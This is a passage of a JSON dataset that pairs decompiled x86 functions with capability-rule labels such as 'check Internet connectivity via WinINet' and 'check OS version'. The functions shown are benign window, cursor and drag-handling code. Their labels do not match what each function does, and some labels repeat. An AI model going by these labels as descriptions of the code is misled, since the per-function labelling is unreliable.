        "decompiled_code": "\nvoid fcn.00438418(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x438486;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x485a9c = *0x485a9c + 1;\n    if (*0x485a9c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*(*0x485aa0 + 0x1c) != 0) {\n            fcn.00437a48();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00406298();\n        fcn.00406298();\n        fcn.00406298();\n        fcn.004045c8();\n        fcn.00406298();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 240
    },
    "004466d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004466d4(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.00447f78();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0043a9d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043a9d4(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.0043a70c();\n    if (((iVar1 != 0) && (*0x483c84 != 0)) && (iVar1 == *(*0x483c84 + 0x30))) {\n        iVar1 = *0x483c84;\n    }\n    return iVar1;\n}\n",
        "token_count": 102
    },
    "0043a9fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043a9fc(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x483c84 = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004039b8(),  iVar1 = *0x483c84,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x483c84 = iVar1;\n        uVar3 = fcn.0044407c();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "0043aeac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043aeac(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.00403a28();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 74
    },
    "0043af48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0043af48(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0043ae30();\n    uVar1 = fcn.0042675c();\n    *(in_EAX + 0x40) = uVar1;\n    fcn.0042d4fc();\n    fcn.004268d8();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 212
    },
    "0043b13c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b13c(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 256
    },
    "0043b1a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0043b1a8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.0043b5f8();\n    uVar2 = func_0x00407304(hWnd, 4);\n    if (uVar2 != *(**0x48466c + 0x30)) {\n        uVar2 = fcn.0043a70c();\n        if (uVar2 == 0) goto code_r0x0043b336;\n        do {\n            uVar2 = *(uVar2 + 0x30);\n        } while (uVar2 != 0);\n        uVar2 = fcn.0044407c();\n        hWnd = uVar2;\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        uVar2 = fcn.0044407c();\n        if (uVar2 != hWnd) {\n            iVar4 = *(*(arg_8h + -0x10) + 0x30);\n            var_18h = uVar2;\n            if (iVar4 == 0) {\n                cVar1 = fcn.004039b8();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.0044407c();\n                }\n            }\n            else {\n                do {\n                    iVar4 = *(iVar4 + 0x30);\n                } while (iVar4 != 0);\n                var_1ch = fcn.0044407c();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043b13c, &var_1ch);\n            uVar2 = sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.00403a28(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004039b8();\n                if ((((cVar1 == '\\0') || (*(*(*0x485ac8 + 0x38) + 0xa0) == 0)) ||\n                    (uVar2 = fcn.0044407c(),  uVar2 != hWnd)) &&\n                   (uVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  uVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\ncode_r0x0043b336:\n    return uVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 808
    },
    "0043b340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0043b340(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0044407c();\n        uVar2 = fcn.0044407c(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 120
    },
    "0043b384": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0043b384(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x485aec != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x48466c + 0xb4)) {\n            (**(**0x485af0 + 8))();\n            iVar4 = *(*0x485aec + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.0041c4c8();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1a6) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.0044407c();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.0043b340(&var_1h + 1),  cVar1 == '\\0')) &&\n                           ((var_10h[0x28] != var_14h || (iVar3 = fcn.00442b74(),  1 < iVar3)))) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.00403a28();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.0043ab0c();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x485af0)[2]) {\n                var_18h = fcn.0043ab9c(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.0043b1a8(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 701
    },
    "0043b4e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b4e0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x485aec == 0) {\n            *0x485aec = fcn.004037f0();\n        }\n        iVar1 = fcn.0041c52c();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.0041c3a4();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.0041c358();\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0043b624": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043b624(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    char in_CL;\n    uint *in_EDX;\n    int32_t var_4h;\n    \n    if (in_CL == '\\0') {\n        uVar1 = fcn.0043b5f8();\n        *in_EDX = uVar1;\n        var_4h = fcn.0043b540(in_EAX, 0);\n    }\n    else {\n        var_4h = fcn.0043b384();\n        if (var_4h != 0) {\n            uVar1 = fcn.0044407c();\n            *in_EDX = uVar1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 175
    },
    "0043b67c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0043b67c(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x485ac8 + 4) != 0) {\n        iVar1 = fcn.0043b540(*0x485ac8 + 0xc, *(*0x485ac8 + 4));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 104
    },
    "0043b6b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043b6b8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x485ac8 + 4);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1a7) != '\\0')) && (*(iVar1 + 0x178) != 0)) &&\n       (iVar2 = fcn.00442ae0(),  iVar2 != 0)) {\n        iVar2 = fcn.00442ae0();\n        if ((iVar2 == 1) && (iVar2 = fcn.0041c4c8(),  iVar2 == *(*0x485ac8 + 0x38))) {\n            return 0;\n        }\n        iVar2 = fcn.0043c0f4();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.0041c52c();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.00442af4();\n    }\n    return var_4h;\n}\n",
        "token_count": 304
    },
    "0043b758": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b758(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x485ae4 == '\\0') &&\n        (uVar9 = *0x485ad4 - *in_EAX >> 0x1f,  (*0x485ad4 - *in_EAX ^ uVar9) - uVar9 < *0x485ae0)) &&\n       (uVar9 = *0x485ad8 - in_EAX[1] >> 0x1f,  (*0x485ad8 - in_EAX[1] ^ uVar9) - uVar9 < *0x485ae0)) {\n        return;\n    }\n    iVar10 = 0x43b7b2;\n    iVar7 = fcn.0043b624(*0x485ac4);\n    if ((*0x485ae4 == '\\0') && (*0x485ae8 != 0)) {\n        iVar10 = *0x485ad8;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.00445b3c(iVar10);\n    }\n    if (*(*0x485ac4 + 0x9b) == '\\0') {\n        *0x485ae4 = '\\x01';\n    }\n    else {\n        *0x485ae4 = '\\x02';\n    }\n    if (iVar7 != (*0x485ac8)[1]) {\n        fcn.0043b67c();\n        if (*0x485ac8 == NULL) {\n            return;\n        }\n        (*0x485ac8)[1] = iVar7;\n        (*0x485ac8)[2] = iVar10;\n        piVar1 = *0x485ac8;\n        (*0x485ac8)[3] = *in_EAX;\n        piVar1[4] = in_EAX[1];\n        fcn.0043b67c();\n        if (*0x485ac8 == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x485ac8;\n    (*0x485ac8)[3] = *in_EAX;\n    piVar1[4] = in_EAX[1];\n    if ((*0x485ac8)[1] != 0) {\n        fcn.0043d38c();\n        piVar1 = *0x485ac8;\n        (*0x485ac8)[5] = iStack28;\n        piVar1[6] = iStack24;\n    }\n    fcn.0043b67c(in_EAX[1]);\n    (**(**0x485ac8 + 4))();\n    if (*0x485ae8 != 0) {\n        if ((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) {\n            fcn.00445b24();\n            if (*(*0x485ae8 + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.00445b3c(iVar10);\n            }\n            else {\n                fcn.00445c24();\n            }\n        }\n        else {\n            fcn.00445c98();\n            uVar8 = fcn.0045b200();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.0045b200();\n    sub.user32.dll_SetCursor();\n    if (*0x485ae4 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.00403a28(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0043b6b8();\n            (*0x485ac8)[0x16] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.00403a28();\n                *(*0x485ac8 + 0x15) = uVar5;\n            }\n            else {\n                fcn.0043d38c();\n                uVar5 = fcn.00403a28();\n                *(*0x485ac8 + 0x15) = uVar5;\n            }\n        }\n        if ((*0x485ac8 != NULL) && (cVar6 = fcn.00408980(),  cVar6 == '\\0')) {\n            if (cVar4 != '\\0') {\n                (**(**0x485ac8 + 0x34))();\n            }\n            (**(**0x485ac8 + 0x30))();\n            piVar3 = *0x485ac8;\n            piVar2 = *0x485ac8 + 0x18;\n            piVar1 = *0x485ac8 + 0x12;\n            (*0x485ac8)[0x17] = (*0x485ac8)[0x11];\n            *piVar2 = *piVar1;\n            piVar3[0x19] = piVar3[0x13];\n            piVar3[0x1a] = piVar3[0x14];\n        }\n    }\n    return;\n}\n",
        "token_count": 1214
    },
    "0043ba28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ba28(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x485ac8 = in_EAX;\n    in_EAX[1] = 0;\n    sub.user32.dll_GetCursorPos(0x485ad4);\n    piVar1 = *0x485ac8;\n    (*0x485ac8)[3] = *0x485ad4;\n    piVar1[4] = *0x485ad8;\n    *0x485adc = sub.user32.dll_GetCursor();\n    *0x485ad0 = fcn.0043ac40();\n    *0x485ae0 = param_1;\n    cVar2 = fcn.004039b8();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x485ae4 = '\\0';\n        }\n        else {\n            *0x485ae4 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x11];\n        if (in_EAX[0x13] == iVar3 || in_EAX[0x13] - iVar3 < 0) {\n            in_EAX[8] = 0;\n            in_EAX[9] = 0;\n        }\n        else {\n            *(in_EAX + 8) = (in_EAX[3] - iVar3) / (in_EAX[0x13] - in_EAX[0x11]);\n        }\n        iVar3 = in_EAX[0x12];\n        if (in_EAX[0x14] == iVar3 || in_EAX[0x14] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x14] - in_EAX[0x12]);\n        }\n        if (param_2 == '\\0') {\n            *0x485ae4 = '\\0';\n        }\n        else {\n            *0x485ae4 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x485ae8 = (**(**0x485ac8 + 8))();\n    if (*0x485ae8 != 0) {\n        iVar3 = *0x485ad8;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.00445b3c(iVar3);\n    }\n    *0x485af0 = fcn.004037f0();\n    if (*0x485ae4 != '\\0') {\n        fcn.0043b758();\n    }\n    return;\n}\n",
        "token_count": 642
    },
    "0043bb98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043bb98(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x43bd3d;\n    iStack60 = *in_FS_OFFSET;\n    *0x485ac4 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x485acc = 0;\n    if (*(in_EAX + 0x9b) == '\\0') {\n        puStack64 = 0x43bbdf;\n        puStack52 = &stack0xfffffffc;\n        fcn.00403a28();\n        if (*0x485ac4 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x43bc0d;\n            var_8h = fcn.0043ae30();\n            *0x485acc = 1;\n        }\n    }\n    else {\n        fcn.00403a28();\n        if (*0x485ac4 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.0043af48();\n            *0x485acc = 1;\n        }\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x38) + 0x30) == 0) && (cVar1 = fcn.004039b8(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0043bb98::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x44) = lpPoint;\n                *(var_8h + 0x48) = var_ch;\n            }\n            else {\n                fcn.0041b058();\n                puStack64 = 0x43bcde;\n                fcn.0043d360();\n                *(var_8h + 0x44) = var_18h;\n                *(var_8h + 0x48) = var_14h;\n            }\n            fcn.0041b058();\n            *(var_8h + 0x4c) = var_18h;\n            *(var_8h + 0x50) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x44;\n            uVar2 = fcn.0044407c();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 0x5c) = *(var_8h + 0x44);\n        *(var_8h + 0x60) = *(var_8h + 0x48);\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n    }\n    fcn.0043ba28();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 819
    },
    "0043bd5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043bd5c(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x485ac8 + 4) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x485ae4 == '\\x02')) {\n        cVar1 = (**(**0x485ac4 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x485ac4)[0x28] != 0)) {\n            if ((*0x485ac4)[0x28] != 0) {\n                uVar2 = fcn.00403a28();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 225
    },
    "0043bdd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043bdd0(void)\n\n{\n    char in_AL;\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ah;\n    uint32_t var_6h;\n    uint var_1h;\n    \n    puStack24 = &fcn.0043bdd0::var_1h + 1;\n    puStack36 = &fcn.0043bdd0::var_1h + 1;\n    piVar4 = NULL;\n    if ((*0x485ac8 == NULL) || (*(*0x485ac8 + 0xc) != '\\0')) {\n        return;\n    }\n    uStack28 = 0x43c09c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *0x485af4 = *0x485ac8;\n    uStack40 = 0x43c02a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    *(*0x485ac8 + 0xc) = 1;\n    *(*0x485ac8 + 7) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.0043ac88();\n    if (*0x485ae4 == '\\x02') {\n        piVar4 = fcn.004039dc();\n        (**(*piVar4 + 0x34))();\n        *(piVar4 + 0x1b) = piVar4[1] == 0;\n    }\n    if ((*0x485ac8)[1] == 0) {\ncode_r0x0043bea7:\n        var_6h = (*0x485ac8)[4];\n    }\n    else {\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') goto code_r0x0043bea7;\n        var_6h = (*0x485ac8)[6];\n    }\n    cVar1 = fcn.0043bd5c(&fcn.0043bdd0::var_1h + 1);\n    if (cVar1 != '\\0') {\n        if ((*0x485ae4 == '\\x02') && (*(piVar4 + 0x1b) != '\\0')) {\ncode_r0x0043bee6:\n            if (var_1h != '\\0') {\n                uVar2 = 1;\n                goto code_r0x0043bef2;\n            }\n        }\n        else if (*0x485ae4 != '\\0') {\n            cVar1 = fcn.0043b67c();\n            if (cVar1 != '\\0') goto code_r0x0043bee6;\n        }\n    }\n    uVar2 = 0;\ncode_r0x0043bef2:\n    if (*0x485ae4 == '\\x02') {\n        if ((uVar2 != 0) && (*(piVar4 + 0x1b) != '\\0')) {\n            iVar3 = fcn.004544bc();\n            if ((iVar3 != 0) && (*(iVar3 + 0x220) == piVar4[0xe])) {\n                fcn.00458140();\n            }\n            fcn.0043e9fc(*0x485ac8);\n        }\n    }\n    else if (*0x485ae8 == 0) {\n        sub.user32.dll_SetCursor(*0x485adc);\n    }\n    else {\n        fcn.00445c98();\n    }\n    *0x485ac4 = 0;\n    *0x485ac8 = NULL;\n    if ((*0x485af4 != NULL) && ((*0x485af4)[1] != 0)) {\n        if (uVar2 == 0) {\n            (*0x485af4)[3] = 0;\n            (*0x485af4)[4] = 0;\n            var_6h = 0;\n        }\n        fcn.0043b540(*0x485af4 + 3, (*0x485af4)[1]);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x43c031;\n    uStack40 = 0x43bfed;\n    fcn.00403820();\n    *0x485af0 = 0;\n    if (*0x485af4 != NULL) {\n        *(*0x485af4 + 0xc) = 0;\n        uStack40 = var_6h;\n        uStack44 = var_6h & 0xffffff00 | uVar2;\n        (****0x485af4)();\n    }\n    *0x485ac8 = NULL;\n    return;\n}\n",
        "token_count": 1127
    },
    "0043c0a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c0a8(void)\n\n{\n    if (*0x485ac8 != 0) {\n        fcn.0043bdd0();\n    }\n    *0x485ac4 = 0;\n    return;\n}\n",
        "token_count": 53
    },
    "0043c13c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
